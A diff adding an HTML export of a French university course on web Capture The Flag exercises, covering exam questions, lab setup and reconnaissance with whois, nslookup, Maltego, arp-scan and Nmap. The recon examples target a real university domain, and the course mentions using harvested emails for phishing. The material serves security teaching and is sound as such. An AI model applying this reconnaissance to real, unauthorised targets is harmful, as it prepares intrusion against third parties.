@@ -1,10 +1,1260 @@
-<html>
-    <head>
-        <title>TEST</title>
-    </head>
-    <body>
-        <h1>
-            TEST
-        </h1>
-    </body>
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="" xml:lang="">
+<head>
+  <meta charset="utf-8" />
+  <meta name="generator" content="pandoc" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes" />
+  <title>main_poly_v2</title>
+  <style type="text/css">
+      code{white-space: pre-wrap;}
+      span.smallcaps{font-variant: small-caps;}
+      span.underline{text-decoration: underline;}
+      div.column{display: inline-block; vertical-align: top; width: 50%;}
+  </style>
+</head>
+<body>
+<p> </p>
+<p>Copyright © 2020 Vincent, Gouyen, Belpaume, Crand, Salespara, Chevallier, Guillemin<br />
+Licensed under the Creative Commons Attribution-NonCommercial 3.0 Unported License (the “License”). You may not use this file except in compliance with the License. You may obtain a copy of the License at <a href="http://creativecommons.org/licenses/by-nc/3.0">http://creativecommons.org/licenses/by-nc/3.0</a>. Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an <span class="smallcaps">“as is” basis, without warranties or conditions of any kind</span>, either express or implied. See the License for the specific language governing permissions and limitations under the License.<br />
+</p>
+<h1 id="première-partie">Première partie</h1>
+<h2 id="compétences-pour-le-ds">Compétences pour le DS</h2>
+<p>Afin de vous aider à préparer le DS sur le module CTF, nous allons vous proposer de focaliser vos révisions sur plusieurs concepts que l’on va énoncer ici.</p>
+<ul>
+<li><p><strong>Définir un CTF</strong></p></li>
+<li><p><strong>La règle de l’ethical hacking</strong></p></li>
+<li><p><strong>Les deux types de collecte d’informations et leurs différences</strong></p></li>
+<li><p><strong>Citez les deux principales choses à faire en début de CTF</strong></p></li>
+<li><p><strong>Donner les étapes du 3-way Handshake</strong></p></li>
+<li><p><strong>Expliquer le principe du spoof</strong></p></li>
+<li><p><strong>A part le spoof donner un moyen de se faire discret sur le réseau pour Nmap et Nikto par exemple</strong></p></li>
+<li><p><strong>Donner la différence entre une attaque par dictionnaire et par bruteforce</strong></p></li>
+<li><p><strong>Quel est le principal inconvénient de faire soi-même un dictionnaire aléatoire ?</strong></p></li>
+<li><p><strong>Donner une raison de faire un DOS et expliquer l’une de ses attaques</strong></p></li>
+<li><p><strong>Donner le principal avantage des cookies et son inconvénient</strong></p></li>
+<li><p><strong>Donner le risque d’une faille XSS</strong></p></li>
+<li><p><strong>Rappeler la structure d’une base de données</strong></p></li>
+<li><p><strong>Quel outil permet d’exploiter une faille SQL et que faut-il faire afin d’éviter cette faille ?</strong></p></li>
+<li><p><strong>Quel est l’intérêt de Burpsuite contre un formulaire ou un upload ?</strong></p></li>
+<li><p><strong>Quelle est la principale force de Metasploit ?</strong></p></li>
+<li><p><strong>Décrire brièvement l’architecture modulaire de Metasploit</strong></p></li>
+<li><p><strong>Quel est l’intérêt d’avoir une architecture modulaire (Metasploit)?</strong></p></li>
+<li><p><strong>Quelles sont les différences entre un reverse shell "classique" et un reverse shell avec Meterpreter?</strong></p></li>
+<li><p><strong>Quelles sont les différences entre un stageless et un staged payload? (Meterpreter)</strong></p></li>
+<li><p><strong>Qu’est ce qu’un exploit/payload/Encoders ?</strong></p></li>
+<li><p><strong>Si vous aviez un mot de passe hashé à tester, quel outil utiliseriez-vous ?</strong></p></li>
+<li><p><strong>Donner l’utilité de l’outil Steghide</strong></p></li>
+<li><p><strong>Expliquer ce qu’est un reverse-shell ainsi que son fonctionnement</strong></p></li>
+<li><p><strong>Donner une méthode pour devenir administrateur d’une machine et l’expliquer</strong></p></li>
+</ul>
+<h2 id="planning">Planning</h2>
+<p>— <strong>2 CM total : 3H45</strong><br />
+— <strong>3 TP de 3h</strong></p>
+<p><strong>Notation</strong> : <span class="math inline">$\dfrac{Note_{DS}+Note_{TP}}{2}$</span></p>
+<p>*<span>Première séance CM</span></p>
+<p>Présentation de la « zone de travail », généralisation des attaques WEB, présentation du principe d’attaque pour les CTF WEB, collecte d’informations.</p>
+<p>*<span>Deuxième séance CM</span></p>
+<p>Présentation des failles, des outils d’exploitation, infiltration par reverse-shell.</p>
+<h2 id="introduction">Introduction</h2>
+<p>La sécurité informatique au sein d’une entreprise est aujourd’hui devenue le domaine avec le plus grand enjeu. Il faut donc du personnel spécialisé dans ce dernier afin de la mettre en place. On se rend facilement compte que le meilleur moyen de s’améliorer dans ce milieu est dans un premier temps de se documenter puis de réaliser des attaques pour savoir par la suite comment s’en défendre. C’est à ce moment-là que le "Capture The Flag" ou bien "Capturer Le Drapeau" intervient. A l’origine, un CTF est un jeu à l’air libre où deux équipes s’affrontent pour s’emparer du drapeau de l’adversaire. On peut alors s’apercevoir que le monde informatique est semblable à celui réel. Un CTF est alors un concept ayant pour but d’infiltrer une machine cible et de trouver un document, le "flag". Le CTF s’est démocratisé en 1996 lors des premières compétitions organisées par la DEF CON. La DEF CON est la convention de hackeur la plus connue du monde.<br />
+Les CTF s’inspirent de la vraie vie même si cela reste un terrain d’entraînement. Les CTF reposent sur plusieurs domaines qui sont : le reverse engineering, l’exploitation web, le forensic, le réseau, la cryptographie, la sécurité mobile, la stéganographie et d’autres encore. Tous ces domaines sont les piliers de la sécurité informatique. Il faudra donc être polyvalent afin d’exploiter les failles et de résoudre un CTF. Nous allons donc voir lors de ce cours les différents moyens de parvenir à nos fins.<br />
+Nous tenons à rappeler qu’il est strictement interdit de pratiquer de l’ethical hacking sur un réseau qui n’est pas le vôtre et où vous n’avez pas l’autorisation de réaliser une attaque. Ce cours a été créé dans un but éducatif et non malveillant.</p>
+<h1 id="deuxième-partie">Deuxième partie</h1>
+<h2 id="le-ctf">Le CTF</h2>
+<p>Un CTF<a href="#fn1" class="footnote-ref" id="fnref1"><sup>1</sup></a> ou "Capture The Flag" est une activité consistant à s’introduire dans une machine cible vulnérable pour y trouver un drapeau en guise de victoire. Les possibilités de CTF sont extrêmement vastes et ces dernières nécessitent des connaissances dans de multiples domaines. C’est pour cette raison que nous allons nous concentrer sur les CTFs "Web" afin de pouvoir exploiter complètement vos connaissances en sortie d’IUT R&amp;T.</p>
+<p>Avant de commencer à vous présenter des attaques bien précises, nous allons vous expliquer les différents angles d’attaques que nous pouvons retrouver généralement lors d’un CTF. En effet, il y a toujours un "protocole" à suivre lors de la réalisation d’une attaque qui va nous permettre de résoudre un CTF. Ce protocole se divise en trois grandes phases qui sont :</p>
+<ul>
+<li><p>La collecte d’informations</p></li>
+<li><p>L’exploitation de ces informations via des failles</p></li>
+<li><p>L’intrusion dans le système cible avec possibilité de devenir administrateur<br />
+</p></li>
+</ul>
+<p>Chacune de ces phases contient des sous-phases en fontion des outils utilisés et donc des failles. Comme vous pouvez le voir sur le schéma indiqué dans la <strong>figure <a href="#fig:schema-ctf" data-reference-type="ref" data-reference="fig:schema-ctf">1.1</a></strong>, une attaque est coupée en trois parties. La première qui se nomme "Recherche d’informations active". C’est une sous-catégorie de la recherche d’informations. En effet, au sein de ce schéma, on va considérer que la recherche d’informations passive a déjà été effectuée car elle n’est pas obligatoire. La deuxième phase nous présente les outils que nous utilisons en général pour utiliser les informations récupérées via la phase précédente et ainsi exploiter des failles. Ces trois outils sont les suivants : Burpsuite, SQLMAP et Metasploit. Burpsuite va être utilisé pour contourner des restrictions dans un formulaire via son proxy et ainsi permettre la création d’un reverse-shell par exemple. SQLMAP va nous permettre d’exploiter des failles SQL et ainsi dévoiler une base de données. Metasploit est quant à lui beaucoup plus complexe. En effet, l’ensemble d’un CTF pourrait être entièrement réalisé avec cet outil car il regroupe l’ensemble des outils de pentest ainsi que d’autres modules tel que Meterpreter. Le but de cette phase est donc d’obtenir directement un reverse-shell ou bien des informations qui pourraient être cryptées. C’est donc à partir de ce moment qu’il faudra choisir la branche adéquate pour réaliser son CTF.</p>
+<figure>
+<img src="oui/images/Chapitre1/Attackdiag.png" alt="Schéma d’attaque d’un CTF" id="fig:schema-ctf" style="width:100.0%" /><figcaption>Schéma d’attaque d’un CTF<span label="fig:schema-ctf"></span></figcaption>
+</figure>
+<p>Comme on a pu le comprendre, aucune attaque n’est la même et c’est en pratiquant que l’on peut comprendre pourquoi utiliser un outil plutôt qu’un autre. Cependant, avant d’utiliser ces outils, nous allons nous pencher sur notre environnement de travail.</p>
+<p>Kali Linux est une distribution Linux, basée sur Debian, orientée sur la sécurité informatique. Anciennement BackTrack, cette distribution a su se réinventer en devenant Kali et ainsi regrouper un nombre « incalculable » de logiciels conçus pour la sécurité et l’intrusion informatique. C’est pour cette raison que nous avons choisi de travailler sur cette distribution afin d’effectuer des CTF.</p>
+<p>Pour commencer un CTF, il nous faut aller chercher une machine virtuelle attaquable. Pour cela, nous pouvons aller sur le site de Vulnhub et récupérer un fichier avec l’extension .OVA. Vulnhub est un site répertoriant des CTFs créés par la communauté. Il est donc très facile de s’exercer via ce site.<br />
+Ce fichier OVA contient notre machine cible que l’on pourra allumer sous Virtualbox comme vu en <strong>figure <a href="#fig:import-ova" data-reference-type="ref" data-reference="fig:import-ova">1.2</a></strong>.</p>
+<figure>
+<img src="oui/images/Chapitre1/importation.png" alt="Imporation d’un CTF" id="fig:import-ova" style="width:77.0%" /><figcaption>Imporation d’un CTF<span label="fig:import-ova"></span></figcaption>
+</figure>
+<p>Après avoir réalisé cette étape, vous pourrez aller vous occuper des interfaces réseaux de votre Kali et de votre CTF afin qu’il puisse communiquer entre eux. En général, le CTF sera configuré en dhcp ce qui vous permettra d’utiliser le réseau NAT ou bien le mode Pont/Bridge. Pour rappel, le réseau NAT sous Virtualbox créé un routeur et un service DHCP entre votre ordinateur et votre machine virtuelle. Ainsi, cette dernière a accès à internet et à son propre réseau. Le mode Pont va vous permettre d’annoncer votre machine virtuelle comme machine à part entière sur votre réseau. Ainsi, la VM pourra communiquer sur votre réseau et obtenir via DHCP une adresse si le service est activé sur le réseau. Dans les deux cas, pensez à mettre votre machine attaquante et cible dans le même réseau. Une fois que cette configuration est faite, vous pourrez allumer vos machines et commencer votre attaque tout en respectant l’ordre d’attaque.</p>
+<h2 id="chap:Mini Projet">Techniques de collecte d’informations</h2>
+<p>Lors du début de chaque CTF ou de pentesting en général, il y a une phase très importante qu’il ne faut pas oublier qui est la recherche d’informations sur la machine à attaquer. Il existe 2 types de recherche d’informations :</p>
+<ul>
+<li><p>Collecte d’informations passive</p></li>
+<li><p>Collecte d’informations active</p></li>
+</ul>
+<p>Nous verrons dans un premier temps la collecte d’informations passive d’une cible puis la collecte d’informations active.</p>
+<p>La collecte d’informations passive est le moyen par lequel un attaquant peut récupérer des informations sur une entreprise ou une machine, sans entrer directement en contact avec cette dernière. En effet, ces informations sont la plupart du temps trouvable sur internet.<br />
+Par exemple, à partir de recherches sur internet, on peut trouver des adresses IP ou encore des emails ou des noms de domaines. Toutes ces informations peuvent être d’ordre publique. Une simple commande <code>ping</code> sur un site internet permet de récupérer une adresse IP. Imaginez par exemple, une attaque contre <a href="http://rt.iut-velizy.uvsq.fr/">http://rt.iut-velizy.uvsq.fr/</a>. Il va falloir dans un premier temps déterminer quels systèmes sont utilisés par la société et quels sont les systèmes que nous pouvons attaquer. De plus, certains systèmes peuvent ne pas appartenir à la société cible et pourraient alors être considérés comme hors de portée de l’attaque.</p>
+<p>Whois ("Qui est" en francais) est un outil permettant d’interroger des bases d’informations (registres) concernant les noms de domaines et adresses IP. Les données contenues dans ces bases ne comportent aucune forme de garantie mais permettent généralement de retrouver le propriétaire d’un domaine ou d’une machine.</p>
+<p>Il existe plusieurs bases de données connues:</p>
+<ul>
+<li><p>RIPE NCC (Réseaux IP Européens, whois.ripe.net) pour l’Europe</p></li>
+<li><p>APNIC (Asia Pacific Network Information Center) pour l’Asie et le Pacifique</p></li>
+<li><p>ARIN (American Registry for Internet Numbers, whois.arin.net) pour l’Amérique du Nord et l’Afrique Sub-Saharienne</p></li>
+<li><p>LACNIC (Regional Latin-American and Caribbean IP Address Registry, whois.lacnic.net) pour l’Amérique latine et les Caraïbes</p></li>
+<li><p>INTERNIC (whois.internic.net) pour les autres parties du globe</p></li>
+</ul>
+<p>Il existe des sites sur internet permettant d’utiliser cet outil. Il est également présent sous Kali linux.<br />
+<strong>Utilisation de la commande whois avec Kali linux:</strong><br />
+Nous allons utiliser whois sur le site <a href="uvsq.fr">uvsq.fr</a> dans <strong>figure <a href="#fig:whois" data-reference-type="ref" data-reference="fig:whois">2.1</a></strong>.<br />
+</p>
+<figure>
+<img src="oui/images/Whois/whois2.PNG" alt="whois uvsq.fr" id="fig:whois" style="width:100.0%" /><figcaption>whois uvsq.fr<span label="fig:whois"></span></figcaption>
+</figure>
+<p>La commande whois nous donne des informations sur le nom de domaine <a href="uvsq.fr">uvsq.fr</a>. On apprend ici les différents serveurs DNS qui gèrent ce domaine dans la <strong>figure <a href="#fig:whoisdns" data-reference-type="ref" data-reference="fig:whoisdns">2.2</a></strong>.</p>
+<figure>
+<img src="oui/images/Whois/whois3.PNG" alt="whois uvsq.fr" id="fig:whoisdns" style="width:100.0%" /><figcaption>whois uvsq.fr<span label="fig:whoisdns"></span></figcaption>
+</figure>
+<p>Whois est capable de récupérer l’email de l’administateur qui gère le domaine <a href="uvsq.fr">uvsq.fr</a>. Ces informations peuvent être plus ou moins utiles lors d’une attaque.</p>
+<p>Il est également possible de spécifier l’adresse IP de <a href="www.uvsq.fr">www.uvsq.fr</a> pour récupérer des informations relatives à l’adresse IP comme vous pouvez voir en <strong>figure <a href="#fig:whoisip" data-reference-type="ref" data-reference="fig:whoisip">2.3</a></strong>.</p>
+<figure>
+<img src="oui/images/Whois/whois4.PNG" alt="whois ip www.uvsq.fr" id="fig:whoisip" style="width:90.0%" /><figcaption>whois ip www.uvsq.fr<span label="fig:whoisip"></span></figcaption>
+</figure>
+<p>— Le champ <strong>inetnum</strong> correspond à une plage d’adresse IP détenue par le domaine en question. Par exemple, pour le domaine <a href="uvsq.fr">uvsq.fr</a> sa plage d’IP sera comprise entre <strong>193.51.33.0</strong> et <strong>193.51.33.255</strong>.<br />
+Un simple script en python permet de vérifer cela et d’obtenir un résultat visible en <strong>figure <a href="#fig:resultatprogpy" data-reference-type="ref" data-reference="fig:resultatprogpy">2.4</a></strong>. (Script en annexe <a href="#fig:nslookup" data-reference-type="ref" data-reference="fig:nslookup">[fig:nslookup]</a>)</p>
+<figure>
+<img src="oui/images/Whois/script-python.PNG" alt="Résolution DNS pour la plage d’ip de uvsq.com" id="fig:resultatprogpy" style="width:80.0%" /><figcaption>Résolution DNS pour la plage d’ip de uvsq.com<span label="fig:resultatprogpy"></span></figcaption>
+</figure>
+<p>On constate à travers cette capture que les IP de la plage pointent vers le nom de domaine <a href="uvsq.fr">uvsq.fr</a>. Cela peut être très utile pour cibler des services à attaquer avec leur IP public. Par exemple, l’IP <strong>193.51.33.3</strong> semble correspondre à un potentiel serveur mysql à en croire son nom. On remarque également que l’autorité de <strong>uvsq.com</strong> a créé un alias de l’enregistrement <strong>www</strong> vers <strong>preprod.uvsq.com</strong>, puisque ces noms ont les même IP et qu’ils redirigent tous deux vers le site internet de l’uvsq.<br />
+— Le champ <strong>netname</strong> correspond au nom donné à une plage d’adresses IP. Un nom de réseau est composé de lettres, de chiffres, du caractère de soulignement et du trait d’union. Le premier caractère d’un nom doit être une lettre, et le dernier caractère d’un nom doit être une lettre ou un chiffre.<br />
+</p>
+<p>L’outil Nslookup est un outil implanté sur beaucoup de systèmes d’exploitation (OS) tel que Windows ou Linux. Cet outil permet de faire des résolutions DNS à partir d’un nom de domaine. En effet, cela est très pratique lorsqu’on veut récupérer une IP à partir d’un nom tel que <strong>www.uvsq.fr</strong>.<br />
+<strong>Fonctionnement requête DNS</strong><br />
+Nous allons ici présenter le bref fonctionnement d’une requête DNS puisque cette partie a déjà été expliqué dans d’autres modules auparavant. En premier lieu, le DNS permet d’associer un nom à une IP ce qui est très utile pour l’être humain.<br />
+Le protocole DNS est un protocole UDP avec comme numéro de port 53. Le DNS est un modèle réparti hiérarchisé, sa mise en œuvre requiert plusieurs serveurs qui prennent en charge individuellement la traduction de parties complémentaires de l’espace des noms afin de rendre plus souple le traitement des sollicitations. Ces parties appelées "zones" sont en fait des domaines de noms dont l’administration est définie et attribuée à un ou plusieurs serveurs.</p>
+<p>La <strong>figure <a href="#fig:repartitiondns" data-reference-type="ref" data-reference="fig:repartitiondns">2.5</a></strong> nous présente un schéma de la répartition des zones DNS.</p>
+<figure>
+<img src="oui/images/Nslookup/dns.png" alt="Répartition des zones DNS" id="fig:repartitiondns" style="width:50.0%" /><figcaption>Répartition des zones DNS<span label="fig:repartitiondns"></span></figcaption>
+</figure>
+<p>Le domaine Racine est géré par les 13 serveurs DNS nommés <code>&lt;x&gt;.root-servers.net</code>, où <code>&lt;x&gt;</code> est une lettre comprise entre ‘a’ à ‘m’. Ces serveurs racines sont gérés par des organisations différentes nommées par l’ICANN. Les domaines enfants sont dits les domaines de premier niveau ou TLD (Top Level Domain). On y retrouve le domaine .com, .fr etc...<br />
+</p>
+<p>Expliquons maintenant ce qu’il se passe lorsqu’un client effectue une requête DNS.</p>
+<p>Il existe deux types de requête DNS. Les requêtes itératives, et récursives. Nous ne présenterons ici que les requêtes récursives, comme illustré sur la <strong>figure <a href="#fig:dns2" data-reference-type="ref" data-reference="fig:dns2">2.6</a></strong>.</p>
+<figure>
+<img src="oui/images/Nslookup/dns2.png" alt="Schéma d’une requête DNS récursive" id="fig:dns2" style="width:60.0%" /><figcaption>Schéma d’une requête DNS récursive<span label="fig:dns2"></span></figcaption>
+</figure>
+<ol>
+<li><p>Le client effectue une requête DNS à son serveur DNS local.</p></li>
+<li><p>Le serveur DNS contacte le serveur racine pour récupérer l’ip du serveur TLD de la zone fr.</p></li>
+<li><p>Le DNS local contacte le TLD de la zone fr pour récupérer l’ip du sous domaine oktey.</p></li>
+<li><p>Ce dernier contacte le serveur qui fait autorité sur la zone oktey.fr pour récupérer l’ip associé à l’enregistrement mx de mail.okley.fr.</p></li>
+</ol>
+<p>On constate qu’avec l’utilisation des requête récursives, c’est le serveur DNS local qui s’occupe de faire toutes les requêtes.<br />
+Avec l’outil <strong>Nslookup</strong>, il est également possible d’effectuer une résolution inverse. En effet, cette dernière permet de récupérer le nom associé à une adresse IP. Pour ce faire, on utilise le domaine <strong>in-addr.arpa</strong> (RFC 1035) pour retrouver le nom associé.</p>
+<p>La technique de résolution inverse a été utilisée dans la figure 2.4. En effet, à partir de la plage d’IP récupéré avec l’outil <strong>whois</strong>, on peut effectuer des résolutions inverses pour tenter de récupérer le nom derrière ces IP. Ainsi, cela peut nous indiquer un service qui serait hébergé par cette IP. A partir de là, il sera plus facile d’orienter nos recherches pour continuer l’attaque.</p>
+<p>Maltego est un outil open source intélligent permettant la recherche d’informations précises sur une personne ou une entreprise. On appel ce genre d’outil un footprinting (reconnaissance passive). Maltego permet l’automtisation des tâches de recherches. Ainsi, avec ces informations, Maltego les représentent sous forme d’un graphique détaillé.<br />
+</p>
+<figure>
+<img src="oui/images/maltego/uvsq2.PNG" alt="Présentation graphique de maltego" id="fig:graphmaltego" style="width:100.0%" /><figcaption>Présentation graphique de maltego<span label="fig:graphmaltego"></span></figcaption>
+</figure>
+<p>Dans la <strong>figure <a href="#fig:graphmaltego" data-reference-type="ref" data-reference="fig:graphmaltego">2.7</a></strong>, on peut voir l’utilisation de Maltego sur le domaine <strong>uvsq.com</strong>. On peut donc récupérer des adresses mails, des numéros de téléphone, des noms de personnes ainsi que les sous domaines DNS associés à <strong>uvsq.com</strong>. Il est également possible de récupérer des adresses IP ainsi que le numéro d’AS sur lequel le site est hébergé.<br />
+Pour fonctionner, Maltego travaille à partir de bases de données ainsi que de recherches faites sur le web. En somme, cela évite à l’utilisateur de faire de longues recherches pour trouver une information sur une personne ou un site. Cela peut être extrêmement utile lors de la collecte d’informations sur une entreprise. En effet, avec les informations que nous pouvons récupérer, il serait possible de cibler plus facilement les attaques ou même de faire du phishing avec les adresses emails obtenues.</p>
+<p>La collecte d’informations active va consister à reccueillir des informations en effectuant des requêtes sur le réseau et/ou machine cible. Cette étape va donc nous permettre de récupérer des informations telles que l’IP, l’adresse MAC, les ports ouverts, etc... Sans cette phase, une attaque serait impossible. C’est pourquoi il est important de penser à marquer dans un fichier texte l’ensemble des informations obtenues au cours de cette recherche. Nous allons dans cette partie vous présenter les outils adéquats et leur fonctionnement afin que vous puissiez obtenir facilement les données que nous pourrons exploiter par la suite. Nous verrons les outils suivants :</p>
+<ul>
+<li><p>Arp-scan en tant que scanneur de machines</p></li>
+<li><p>Nmap en tant que scanneur de ports</p></li>
+<li><p>Dirb / Dirbuster en tant que scanneur de répertoire Web</p></li>
+<li><p>Nikto en tant que scanneur de vulnérabilités</p></li>
+</ul>
+<p>Arp-scan est un utilitaire qui permet d’obtenir les adresses IP d’un réseau via la couche 2 du modèle OSI . Le modèle OSI est une norme d’exemple pour tous les types de transmissions réseaux. Ce modèle peut être vu comme en <strong>figure <a href="#fig:osi" data-reference-type="ref" data-reference="fig:osi">2.8</a></strong>.</p>
+<figure>
+<img src="oui/images/Arpscan/modeleOSI.PNG" alt="Schéma du modèle OSI" id="fig:osi" style="width:40.0%" /><figcaption>Schéma du modèle OSI<span label="fig:osi"></span></figcaption>
+</figure>
+<p>La couche 2 est la couche de liaison de données. Cette dernière correspond à l’adressage physique des machines, soit l’adresse MAC. L’adresse MAC est l’adresse unique d’une interface réseau d’un équipement. Cette adresse est codée en hexadécimal en 6 octets.<br />
+<strong>Fonctionnement d’Arp-scan</strong><br />
+Cet outil va envoyer une requête ARP en broadcast sur le réseau et afficher l’IP, l’adresse MAC ainsi que, si possible, l’origine de chaque hôte. Si un hôte ne répond pas, le paquet ARP sera envoyé à nouveau. Le nombre maximum de tentatives peut être modifié avec l’option –retry. Cependant, si l’on réduit le nombre de tentatives, alors cela réduira le temps du scan mais engendrera le risque de perdre certains résultats en raison de la perte de paquets. Comme vous pouvez le voir sur la <strong>figure <a href="#fig:arpscanwireshark" data-reference-type="ref" data-reference="fig:arpscanwireshark">2.9</a></strong>, la capture Wireshark effectuée après un "arp-scan" se présente de la même manière qu’une requête ARP.</p>
+<figure>
+<img src="oui/images/Arpscan/wireshark.PNG" alt="Capture Wireshark" id="fig:arpscanwireshark" style="width:100.0%" /><figcaption>Capture Wireshark<span label="fig:arpscanwireshark"></span></figcaption>
+</figure>
+<p>Le protocole ARP est un protocole de niveau 2 (couche de liaison de données) qui est utilisé pour déterminer l’adresse MAC (couche 2) d’un hôte distant à partir de son adresse IP (couche 3). Le protocole ARP a été conçu pour fonctionner avec n’importe quel format d’adresse de couche 2 et de couche 3, mais l’utilisation la plus courante est de cartographier un réseau. Cependant, cet outil ne peut être utilisé que sur des réseaux LAN car les requêtes ARP ne peuvent pas être routées dans le cas d’un scan de réseau Local. Ce protocole utilise des adresses IP, mais il n’est pas basé sur IP. Ainsi, Arp-scan peut être utilisé sur une interface qui n’est pas configurée pour IP. La <strong>figure <a href="#fig:arpscanl" data-reference-type="ref" data-reference="fig:arpscanl">2.10</a></strong> présente l’utilisation la plus commune de cet outil.</p>
+<figure>
+<img src="oui/images/Arpscan/unknown.png" alt="Arp-scan - -localnet" id="fig:arpscanl" style="width:90.0%" /><figcaption>Arp-scan - -localnet<span label="fig:arpscanl"></span></figcaption>
+</figure>
+<p>Une fois l’IP cible récupérée, nous allons pouvoir analyser ses ports avec Nmap.</p>
+<p>Nmap est un utilitaire permettant de scanner les ports ouverts d’une machine ou d’un ensemble de machines présentes dans un même réseau. Les ports (logiciels) d’une machine permettent de distinguer les différents programmes qui écoutent et transmettent des informations sur cette machine. En effet, chaque programme ou service se verra atribuer un numéro de port qui servira à identifer le processus associé. En trouvant ces ports, Nmap se rend comme l’élément essentiel d’une attaque réseau. En effet, sans cette analyse, nous serions incapable de trouver un chemin d’attaque à moins d’avoir une chance inouïe. C’est pourquoi nous allons utiliser cet utilitaire pour résoudre nos CTFs.<br />
+<strong>Fonctionnement de Nmap</strong><br />
+Pour comprendre comment fonctionne Nmap, il va falloir revoir les bases du protocole TCP grâce à la <strong>figure <a href="#fig:3way" data-reference-type="ref" data-reference="fig:3way">2.11</a></strong>.</p>
+<figure>
+<img src="oui/images/nmap/3way.png" alt="Three-way Handshake" id="fig:3way" style="width:80.0%" /><figcaption>Three-way Handshake<span label="fig:3way"></span></figcaption>
+</figure>
+<p>Le protocole TCP de TCP-IP est situé au niveau de la couche Transport du modèle OSI (couche 4). Il va nous permettre d’établir une connexion fiable et sans pertes. Dans un premier temps, TCP va établir la connexion via le Three-way Handshake qui sont :</p>
+<ul>
+<li><p>SYN</p></li>
+<li><p>SYN ACK</p></li>
+<li><p>ACK</p></li>
+</ul>
+<p>A la suite de cette étape, le protocole de plus haut niveau faisant les requêtes pourra émettre et sera suivi dans un ACK TCP pour s’assurer de l’intégrité de la trame comme on peut le voir sur la <strong>figure <a href="#fig:acktcp" data-reference-type="ref" data-reference="fig:acktcp">2.12</a></strong>.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nikto/wireshark1.PNG" alt="ACK TCP" id="fig:acktcp" style="width:100.0%" /><figcaption>ACK TCP<span label="fig:acktcp"></span></figcaption>
+</figure>
+<p>Sur l’exemple ci-dessus, on peut voir dans la section "Info" de Wireshark que les ports sont indiqués. On comprend alors que TCP ne cible pas une IP mais un socket. Un socket est l’ensemble de l’adresse IP et du port utilisé. Il est souvent représenté sous la forme suivante : <code>192.168.1.200:80</code>. C’est donc en faisant varier le port du socket que Nmap pourra détecter si un port est ouvert ou non. Ainsi, si Nmap reçoit une réponse que de la machine cible à la suite d’un SYN TCP, cela voudra dire que le port est ouvert.<br />
+Maintenant que nous avons compris comment Nmap détecte si un port est ouvert ou non, nous allons nous intéresser à la détection du service associer à ce port. En effet, Nmap peut fournir le nom et même la version d’un service déployé sur un port d’une machine cible.<br />
+Pour cela, l’outil se base sur deux fichiers qu’il utilise comme dictionnaire. Ces deux documents se situent dans son dossier d’éxécution et sur internet :</p>
+<ul>
+<li><p><strong>nmap-services: https://svn.nmap.org/nmap/nmap-services</strong></p></li>
+<li><p><strong>nmap-services-probes: https://svn.nmap.org/nmap/nmap-service-probes</strong></p></li>
+</ul>
+<p>Le fichier nmap-services contient une association de nom de service en fonction du port. En effet, il existe trois catégories de ports :</p>
+<ul>
+<li><p><strong>1-1023 : Well-known ports</strong></p></li>
+<li><p><strong>1024-49151 : Registered ports</strong></p></li>
+<li><p><strong>49152-65535 : Dynamic ports</strong></p></li>
+</ul>
+<p>Les "Well-kown ports" sont des ports attitrés à des service par l’IANA (Internet Assigned Numbers Authority). Ces services sont les plus connus du monde des réseaux et doivent être éxécutés en tant qu’administrateur. Les "Registered ports" sont eux aussi attribués par l’IANA mais ne nécessitent pas d’une éxecution en tant qu’administrateur. Les "Dynamic ports" ou ports dits "éphémères", comme le nom l’indique, sont distribués de manière dynamique par le système d’exploitation afin de pouvoir rentrer en contact avec un service. C’est donc en fontion de ce recensement que Nmap met à jour sa liste nmap-services. La question la plus légitime à la suite de cette explication est la suivante :<br />
+"Comment Nmap peut récupérer le nom d’un service déployé sur un port n’ayant pas été répertorié ?"<br />
+Nmap vous répondra en fonction de votre requête. En effet, si vous n’effectuez qu’un simple scan, l’outil ne va s’appuyer que sur nmap-services pour détecter le service. Cependant, si vous vous voulez avoir de plus amples informations sur le port, il vous faudra effectuer un scan de version. Ce scan se base sur le fichier "nmap-service-probes". Ce dernier contient des requêtes à effectuer en fonction des ports ouverts et des expressions régulières à tester avec la réponse du services. Si le test est positif, Nmap pourra afficher les informations présentes à la suite de l’expression régulière. Ce type de scan est donc beaucoup plus précis. La <strong>figure <a href="#fig:fonctionnementnmap" data-reference-type="ref" data-reference="fig:fonctionnementnmap">2.13</a></strong> représente donc le fonctionnement de base de Nmap.</p>
+<figure>
+<img src="oui/images/nmap/basenmapdiag.png" alt="Schéma fonctionnement Nmap" id="fig:fonctionnementnmap" style="width:90.0%" /><figcaption>Schéma fonctionnement Nmap<span label="fig:fonctionnementnmap"></span></figcaption>
+</figure>
+<p>Nous allons voir maintenant comment appliquer ce fonctionnement à un CTF.</p>
+<p><strong>Application de Nmap</strong><br />
+Dans cette partie, nous allons voir comment utiliser Nmap en ligne de commandes (CLI) en fonction des informations que l’on souhaite récupérer.<br />
+<strong>Mode basique</strong><br />
+Si vous souhaitez ne faire qu’un scan rapide sans option, la <strong>figure <a href="#fig:scanbasique" data-reference-type="ref" data-reference="fig:scanbasique">2.14</a></strong> présente la commande à effectuer.</p>
+<figure>
+<img src="oui/Ancien/imangeancien/Nmap/justeip.PNG" alt="Scan basique" id="fig:scanbasique" style="width:70.0%" /><figcaption>Scan basique<span label="fig:scanbasique"></span></figcaption>
+</figure>
+<p>Comme on peut le voir ci-dessus, le résultat de ce scan simple nous permet de savoir que le port 80 est ouvert et que le sevice associé est HTTP. Si on observe un peu plus cette capture d’écran, on peut voir que Nmap a résolu via DNS le nom de notre cible qui est ici bulldog2-1.<br />
+Du côté de Wireshark, nous pouvons observer, en <strong>figure <a href="#fig:wirebasique" data-reference-type="ref" data-reference="fig:wirebasique">2.15</a></strong>, sa technique de détection de port que l’on nomme "la semi-ouverture de ports".</p>
+<figure>
+<img src="oui/images/nmap/Wirebasique.PNG" alt="Wireshark d’un scan de port 80" id="fig:wirebasique" style="width:100.0%" /><figcaption>Wireshark d’un scan de port 80<span label="fig:wirebasique"></span></figcaption>
+</figure>
+<p>Dans le cas ci-dessus, l’attaquant est en 10.0.2.15 et la cible en 10.0.2.8. On se rend compte Nmap ne complète pas le Three-way Handshake et coupe brutalement la connexion via un RST TCP. Ce scan est très rapide mais manque d’informations et est très visible sur le réseau... Il n’est pas forcément à privilégier.<br />
+<strong>Scan de version</strong><br />
